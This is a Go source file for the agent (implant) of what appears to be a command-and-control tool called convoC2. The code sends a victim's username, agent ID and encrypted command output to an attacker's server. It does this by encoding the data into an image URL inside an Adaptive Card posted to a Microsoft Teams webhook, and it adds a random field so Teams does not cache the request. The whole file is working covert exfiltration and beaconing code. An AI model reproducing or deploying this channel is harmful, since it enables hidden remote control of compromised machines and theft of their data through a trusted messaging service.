package agent

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/cxnturi0n/convoC2/pkg/crypto"
)

type CommandOutputMsg struct {
	Command  string
	Success  bool
	AgentID  string
	Username string
	Output   string
	Random   string // Avoids Teams caching the message, resulting in C2 Server not receiving command output
}

type NotifyMsg struct {
	AgentID  string
	Username string
	Random   string
}

func (agent *Agent) notifyServer(webhookURL string, serverURL string) error {

	notifyMsg := NotifyMsg{
		Random:   random(),
		AgentID:  agent.agentID,
		Username: agent.username,
	}

	encodedResult, err := serializeAndEncodeResult(notifyMsg)
	if err != nil {
		return err
	}

	bodyBytes, err := prepareWebhookPayload(encodedResult, serverURL+"hello/")
	if err != nil {
		return err
	}

	err = postToWebhook(bodyBytes, webhookURL)
	if err != nil {
		return err
	}

	return nil
}

func (agent *Agent) sendResultToServer(commandOutput CommandOutput, webhookURL string, serverURL string) error {

	// Encrypt the command output
	encryptedOutput, err := crypto.Encrypt(commandOutput.Output, agent.agentID)
	if err != nil {
		// Fallback to unencrypted if encryption fails
		encryptedOutput = commandOutput.Output
	}

	commandResponse := CommandOutputMsg{
		Output:   encryptedOutput,
		Success:  commandOutput.Success,
		Command:  commandOutput.Command,
		Random:   random(),
		AgentID:  agent.agentID,
		Username: agent.username,
	}

	encodedResult, err := serializeAndEncodeResult(commandResponse)
	if err != nil {
		return err
	}

	bodyBytes, err := prepareWebhookPayload(encodedResult, serverURL+"command/")
	if err != nil {
		return err
	}

	err = postToWebhook(bodyBytes, webhookURL)
	if err != nil {
		return err
	}

	return nil
}

func serializeAndEncodeResult(result interface{}) (string, error) {

	resultBytes, err := json.Marshal(result)
	if err != nil {
		return "", fmt.Errorf("failed to serialize result: %w", err)
	}

	encodedResult := base64.URLEncoding.EncodeToString(resultBytes)

	return encodedResult, nil
}

func prepareWebhookPayload(encodedResult string, serverURL string) ([]byte, error) {

	if !strings.HasSuffix(serverURL, "/") {
		serverURL += "/"
	}
	// Append the base64-encoded result to the server URL
	fullURL := fmt.Sprintf("%s%s", serverURL, encodedResult)

	body := map[string]interface{}{
		"type": "message",
		"attachments": []map[string]interface{}{
			{
				"contentType": "application/vnd.microsoft.card.adaptive",
				"content": map[string]interface{}{
					"$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
					"type":    "AdaptiveCard",
					"version": "1.2",
					"body": []map[string]interface{}{
						{
							"type":   "TextBlock",
							"text":   "😈 ..convoC2 is cooking.. 😈",
							"size":   "Large",
							"weight": "Bolder",
						},
						{
							"type": "Image",
							"url":  fullURL,
							"size": "Small",
						},
					},
				},
			},
		},
	}

	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return nil, fmt.Errorf("failed to serialize body: %w", err)
	}

	return bodyBytes, nil
}

func postToWebhook(bodyBytes []byte, webhookURL string) error {

	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 202 {
		return fmt.Errorf("server returned non-202 status: %d", resp.StatusCode)
	}

	return nil
}
